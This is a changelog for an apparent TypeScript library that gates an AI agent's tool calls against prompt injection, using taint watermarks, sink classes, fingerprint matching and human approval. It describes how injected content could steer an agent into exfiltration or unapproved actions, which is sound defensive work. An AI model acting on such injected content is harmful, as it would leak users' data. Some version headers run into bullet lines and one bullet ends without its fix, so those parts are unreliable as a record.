- **`ToolExecutor.destinationKeys` — `findOutboundHosts`'s `destinationKeys` narrowing is now wired into `BrokerOptions.allowedOutboundHosts` itself** (`src/types.ts`, `src/broker.ts`, GAPS.md #18, DESIGN.md §7.4). `findOutboundHosts()` (`taint/egress.ts`) already supported an optional `destinationKeys` option to scope its scan to just the argument key(s) that actually carry a call's destination instead of every string leaf in the tree — but it was previously only reachable by calling `findOutboundHosts` directly; `broker.ts`'s own EXFIL gating call site always called it unscoped. ## [0.3.0] - 2026-08-31

### Security

A two-pass, multi-agent adversarial review (11 dimensions, then a second, deliberately different-in-kind 8 dimensions — active exploit construction, concurrency stress, DoS/resource-exhaustion among them) of the entire repository found three genuine critical-severity defects, all in `src/broker.ts`. None are content-matching evasions or gating-policy holes — like every prior review pass, they're correctness/robustness defects in code paths adjacent to the safety-critical ones, this time load-bearing enough to warrant this section rather than "Fixed" below. See DESIGN.md's own implementation notes (§ "a stale gating decision could still execute", § "one broker instance is one session") for the full before/after and the regression that caught a flawed first attempt at the fix.

- **A caller mutating the args object it passed to `call()` AFTER calling it (e.g. during a `REQUIRE_APPROVAL` wait) could change what actually executed without changing what the approval channel was shown or what got audited.** `execute()` used to get its own clone re-derived from the LIVE `args` reference at the moment it actually ran, not from the frozen `argsSnapshot` every other consumer (policy/approval/audit) already used — the exact divergence GAPS.md #16's snapshotting was supposed to close, reopened by one call site never actually reading from the snapshot. Fixed: every `execute()` call site now clones from `argsSnapshot`.
- **A watermark escalation landing during an async gap — `markContextExposure()` (never lock-protected by design, GAPS.md #1) racing a slow custom `PolicyFn`'s own `await`, or any concurrently-dispatched source call racing a `REQUIRE_APPROVAL` wait — let a decision computed against a now-stale, too-permissive `TaintContext` still execute.** Compounding this: `REQUIRE_APPROVAL` held the whole-broker lock for the ENTIRE approval wait, a potentially human-timescale operation, freezing every other call on the broker for its full duration. Fixed together: the gated dispatch path now revalidates against the CURRENT watermark immediately before ever calling `execute()`, discarding a stale decision and computing a fresh one if it moved; the lock is now released around a `REQUIRE_APPROVAL` wait specifically (never for the ordinary no-approval-needed case, which stays inside one unbroken lock hold to avoid reopening the ordering guarantee that fix's own first attempt broke — caught by an existing regression test before shipping).
- **Nothing stopped an integrator from sharing one `Broker` instance across two concurrent, unrelated agent sessions** — every safety guarantee here (the watermark, the Layer 2 registry, `withLock`'s ordering) is per-instance state, so doing this silently cross-contaminates or falsely gates one session off the other's exposure, rather than failing loud. Not detectable from inside `call()` itself; `createBroker()`, `BrokerOptions.sessionId`, `ToolCallBroker`, README.md, and new **GAPS.md #19** now document the one-instance-one-session rule prominently and explain exactly why violating it is unsafe.

### Fixed

- **`wordShingles()` (`taint/fingerprint.ts`) silently defeated fuzzy matching for short (< 5-word) near-duplicate text.** Its fallback treated an entire short text as one whole-text shingle, so two near-identical short payloads — a URL, an account number, a short instruction — differing only by word order or a single word scored EXACTLY 0 overlap, a full miss rather than a partial one, for exactly the shortest and most common realistic payload shape. Now shingles at the largest narrower width that still yields overlapping windows. GAPS.md #8 documents the fix and its own remaining (structural, not fixable without a real storage-cost tradeoff) limitation.
- **`InMemoryTaintRegistry`'s fuzzy-lookup candidate set had no upper bound before the expensive exact-scoring pass.** A registry containing a large cluster of near-duplicate or coincidentally-shingle-colliding records (a realistic adversarial shape) could make a single LSH band or shingle bucket collect a large fraction of the whole registry, silently degrading every subsequent `lookupFuzzy()` call's cost back toward the linear scan the indexing exists to avoid — `FuzzyLookupOpts.maxMatches` only ever bounded the *returned* list, not the *candidate* set scored to produce it. New `InMemoryTaintRegistryOpts.maxFuzzyCandidatesPerLookup` (default 2000) bounds it directly. GAPS.md #13 updated.
- **`scanArgsForTaint()`, `findOutboundHosts()`, and `diffProposedArgs()` all recursed over an args tree with no depth bound.** A sufficiently deep tree (nested objects/arrays forwarded from, say, a prior tool's own deeply-nested JSON result) would overflow the JS call stack: an unpredictable-depth `RangeError` instead of a clean, documented, catchable failure — and on the mandatory scan path specifically, one that produced ZERO audit trail, since it happened before `gateDecision()` had a `TaintContext` to audit with. All three now throw the new `ArgsTooDeepError` at a fixed depth of 500; on the broker's mandatory scan/egress paths this is now caught and recorded as an audited `BLOCK` before re-throwing. GAPS.md #13 updated.
- **`ToolExecutor.trusted`'s own doc comment was misleading, and its worked-examples checklist wasn't actually shipped.** The inline JSDoc framed `trusted` as "deterministic/pure tools may opt out" — determinism has nothing to do with whether a tool's CONTENT is attacker-influenceable (a perfectly deterministic function can still pure-functionally echo an externally-sourced argument), and `trusted: true` is the single most consequential declaration in a `ToolExecutor` (it exempts a source from Layer 0 AND Layer 2 entirely, with no error and no audit trail). The JSDoc now names the real criterion directly. Separately, `docs/classifying-tools.md` — the checklist README.md and this same JSDoc both point to — and `examples/` were both missing from `package.json`'s `files` allowlist, so an installed (not cloned) copy of this package could never actually resolve those links; both now ship. GAPS.md #10 updated.
- **`.github/workflows/release.yml` now creates an actual GitHub Release**, not just a git tag, after a successful npm publish — a plain tag never got the repo's Releases page "Latest" badge, since that's a separate GitHub object a tag alone doesn't create. Uses the runner's preinstalled `gh` CLI (no new third-party Action) with `--generate-notes`; `permissions.contents` bumped from `read` to `write` accordingly.

- **`scanArgsForTaint()`'s mandatory pre-dispatch scan was structurally blind to tainted content nested inside a `Map` or `Set`** — its generic-object fallback walks only `Object.entries()`, which returns zero entries for either, and the broker's default `structuredClone`-based `cloneArgs` preserves both intact. ### Changed

- **Breaking: `FuzzyLookupOpts.jaccardMin` (`src/types.ts`) has been renamed to `overlapMin`.** No backward-compatible alias — a pre-1.0 clean rename per this changelog's own versioning policy. ## [0.1.0] - 2026-08-30

First published release. Everything below was built and validated (typecheck, unit tests, injection corpus, build) before this tag was cut — see `.github/workflows/release.yml` for the tag-triggered publish process that re-validates all of it once more before publishing.

### Added

- **Core broker** (`createBroker()`, `broker.register()`/`wrap()`/`call()`): the scope watermark (`CLEAN < DERIVED_UNTRUSTED < RAW_UNTRUSTED`) as the load-bearing safety boundary, raised atomically the instant an untrusted source tool's result is captured — before the model ever reads it — so gating survives paraphrase, translation, and decision-laundering. Sinks are classified `EXEC`/`MUTATE`/`EXFIL`/`NONE` by declared capability; a default policy matrix gates by watermark level and sink class, with `privateDataSeen` as an escalator (the "lethal trifecta"), never a gate on its own.
- **Fingerprint registry** (`InMemoryTaintRegistry`): exact-hash + LSH-banded simhash + word-shingle overlap matching, secondary and never load-bearing — it can only tighten a policy verdict, never loosen one. Indexed (not a linear scan) for fuzzy lookup; optional `maxEntries` bounds memory for long-running sessions; `FuzzyLookupOpts.maxMatches` and a tree-wide cap in `scanArgsForTaint()` bound how many matches a single lookup/scan can return, without ever dropping the highest-severity match.
- **`broker.summarize()`** — the sanctioned quarantine/condense path: a capability-less LLM call you supply, whose output the broker itself registers as `DERIVED_UNTRUSTED`, with input-provenance validation (length-ratio + asymmetric shingle-coverage checks) against the claimed source record.
- **`broker.declarePlan(steps)`** — optional, additive plan-freeze strict mode: commit to a tool-identity sequence before any untrusted read; a later privileged call that doesn't match the next committed step is rejected on top of, never instead of, the normal policy check.
- **`broker.markContextExposure()`** (plus the `markToolDescriptionExposure`/`markSystemPromptExposure`/`markPastedContentExposure` specializations) — the manual escape hatch for untrusted content reaching the model outside any tracked tool call (a poisoned tool/plugin description, an untrusted system-prompt fragment, pasted content).
- **Cross-process persistence** (`serializeBrokerState()`/`restoreBrokerState()`, `serializeRegistry()`/`restoreRegistry()`) — export/import a broker's watermark and registry as JSON-safe state across a process boundary (e.g. for a sub-agent or a resumed session).
- **`createDeferredApprovalChannel()`** — an `ApprovalChannel` for `REQUIRE_APPROVAL` decisions that need a real human in the loop (a webhook, a Slack approval, an approval-queue UI) rather than a synchronous decision.
- **`jsonSafeClone()`** — an opt-in, faster alternative to `structuredClone` for args snapshotting when tool arguments are plain JSON; throws (rather than silently misrepresenting) on Date/Map/Set/RegExp/class instances/functions/symbols/bigints.
- **Convenience API surface**: `callSafe()` (a non-throwing `call()`), `registerAll()`/`wrapAll()` (bulk registration over a name -> tool record), `defineSource()`/`defineSink()` (pure `ToolExecutor`-building sugar), `registerRawForQuarantine()` (operationalizes the fetch-and-quarantine composite-tool pattern, returning `{ text, taintRecordId }` ready for `summarize()`).
- **`ToolExecutor.mayCallSummarize`** — declare `true` on a composite fetch-and-quarantine tool whose own `execute()` calls `broker.summarize()` internally, so it's correctly excluded from the lock-barrier-exemption optimization (GAPS.md #17).

### Known limitations

Not a soundness guarantee — a conservative, structural approximation with named, honest limits. See `GAPS.md` for the full list. `broker.summarize()` is now serialized against `broker.call()` under concurrent dispatch (GAPS.md #17, fixed) — with one named residual risk: a composite fetch-and-quarantine tool whose `execute()` calls `broker.summarize()` internally must declare `mayCallSummarize: true` (see `docs/classifying-tools.md` question 5) or it stays wrongly eligible for the lock-barrier-exemption optimization and the original race reopens for that one tool.
